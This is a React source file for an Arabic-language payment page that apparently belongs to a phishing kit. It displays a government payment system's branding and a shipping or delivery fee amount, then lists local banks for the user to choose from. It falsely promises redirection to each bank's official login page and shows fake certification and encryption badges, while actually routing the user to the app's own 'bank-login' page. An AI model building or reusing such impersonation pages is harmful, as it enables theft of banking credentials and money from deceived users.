import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowRight, Loader2, Shield, CheckCircle2, ChevronRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  const serviceKey = linkData?.payload?.service_key || 'payment';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
      }, 300);
    }
  }, [countryCode]);
  
  const handleBankSelect = async (bankId: string) => {
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: bankId,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload,
      });

      navigate(`/pay/${id}/bank-login`);
    } catch (error) {
      console.error("Error updating bank selection:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء اختيار البنك",
        variant: "destructive",
      });
    }
  };

  if (linkLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
          <p className="text-lg text-muted-foreground">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen" 
      style={{ backgroundColor: govSystem.colors.background }}
      dir="rtl"
    >
      <div 
        className="relative h-32 sm:h-40"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/20 to-transparent" />
        
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
          <div className="flex items-center gap-3 sm:gap-4">
            <div 
              className="bg-white p-2 sm:p-3 rounded-xl shadow-lg"
              style={{ boxShadow: govSystem.shadows.lg }}
            >
              {govSystem.logo && (
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr} 
                  className="h-10 sm:h-14 object-contain" 
                />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-xl sm:text-2xl mb-0.5">{govSystem.nameAr}</h1>
              <p className="text-xs sm:text-sm opacity-90">اختيار البنك</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Badge 
              className="hidden sm:flex items-center gap-1 px-3 py-1.5"
              style={{ 
                backgroundColor: 'rgba(255, 255, 255, 0.25)',
                backdropFilter: 'blur(10px)',
                border: '1px solid rgba(255, 255, 255, 0.3)',
                color: 'white'
              }}
            >
              <Shield className="w-4 h-4" />
              <span className="text-xs font-semibold">آمن ومعتمد</span>
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-4xl mx-auto">
          <Card 
            className="p-4 sm:p-6 mb-6 shadow-lg"
            style={{ 
              borderTop: `4px solid ${govSystem.colors.primary}`,
              boxShadow: govSystem.shadows.lg 
            }}
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <h2 className="text-xl sm:text-2xl font-bold mb-1">اختر البنك الخاص بك</h2>
                <p className="text-sm text-gray-600">{serviceName}</p>
              </div>
              <div 
                className="px-4 sm:px-6 py-2 sm:py-3 rounded-xl text-white font-bold text-lg sm:text-xl"
                style={{ backgroundColor: govSystem.colors.primary }}
              >
                {formattedAmount}
              </div>
            </div>
          </Card>

          <div 
            className="mb-6 p-4 rounded-xl border-r-4"
            style={{ 
              backgroundColor: `${govSystem.colors.primary}08`,
              borderColor: govSystem.colors.primary 
            }}
          >
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
              <div>
                <p className="font-bold text-sm mb-1">تسجيل دخول آمن ومباشر</p>
                <p className="text-xs text-gray-700">
                  ستتم إعادة توجيهك إلى صفحة تسجيل الدخول الرسمية للبنك المختار لإكمال عملية الدفع بشكل آمن عبر {govSystem.nameAr}
                </p>
              </div>
            </div>
          </div>

          {loadingBanks ? (
            <div className="text-center py-12">
              <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
              <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
              {banks.map((bank) => (
                <Card
                  key={bank.id}
                  className={`p-4 sm:p-5 cursor-pointer transition-all duration-200 border-2 hover:scale-[1.02] hover:shadow-xl ${
                    selectedBank === bank.id ? 'ring-2 ring-offset-2' : ''
                  }`}
                  style={{
                    borderColor: selectedBank === bank.id ? govSystem.colors.primary : '#E0E0E0',
                    background: selectedBank === bank.id ? `${govSystem.colors.primary}08` : 'white',
                    ringColor: selectedBank === bank.id ? govSystem.colors.primary : 'transparent',
                  }}
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div className="flex items-center gap-3 sm:gap-4">
                    <div 
                      className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl flex items-center justify-center shrink-0 bg-white border-2"
                      style={{ 
                        borderColor: bank.color || govSystem.colors.border,
                        backgroundColor: bank.color ? `${bank.color}05` : 'white'
                      }}
                    >
                      {bank.logo ? (
                        <img 
                          src={bank.logo} 
                          alt={bank.nameAr} 
                          className="h-10 sm:h-12 w-auto object-contain p-1"
                        />
                      ) : (
                        <Building2 
                          className="w-8 h-8" 
                          style={{ color: bank.color || govSystem.colors.primary }} 
                        />
                      )}
                    </div>
                    <div className="flex-1">
                      <h3 className="font-bold text-base sm:text-lg mb-0.5">{bank.nameAr}</h3>
                      <p className="text-xs sm:text-sm text-gray-600">{bank.name}</p>
                    </div>
                    <ChevronRight 
                      className="w-5 h-5 sm:w-6 sm:h-6 shrink-0" 
                      style={{ color: govSystem.colors.primary }} 
                    />
                  </div>
                </Card>
              ))}
            </div>
          )}

          {banks.length === 0 && !loadingBanks && (
            <Card className="p-8 text-center">
              <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
              <h3 className="text-xl font-bold mb-2">لا توجد بنوك متاحة</h3>
              <p className="text-gray-600 mb-4">لا توجد بنوك مدعومة لهذه الدولة حالياً</p>
              <Button 
                variant="outline"
                onClick={() => navigate(`/pay/${id}/details`)}
              >
                رجوع
              </Button>
            </Card>
          )}

          <div className="mt-6 grid grid-cols-1 sm:grid-cols-3 gap-3">
            <Card className="p-3 bg-green-50 border-green-200">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-green-700 shrink-0" />
                <p className="text-xs font-semibold text-green-900">معتمد من البنك المركزي</p>
              </div>
            </Card>

            <Card className="p-3 bg-blue-50 border-blue-200">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4 text-blue-700 shrink-0" />
                <p className="text-xs font-semibold text-blue-900">تشفير SSL 256-bit</p>
              </div>
            </Card>

            <Card className="p-3 bg-purple-50 border-purple-200">
              <div className="flex items-center gap-2">
                <Building2 className="w-4 h-4 text-purple-700 shrink-0" />
                <p className="text-xs font-semibold text-purple-900">دفع مباشر وآمن</p>
              </div>
            </Card>
          </div>

          <div className="mt-4 text-center">
            <Button
              variant="outline"
              onClick={() => navigate(`/pay/${id}/details`)}
              className="w-full sm:w-auto"
            >
              رجوع إلى تفاصيل الدفع
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankSelector;
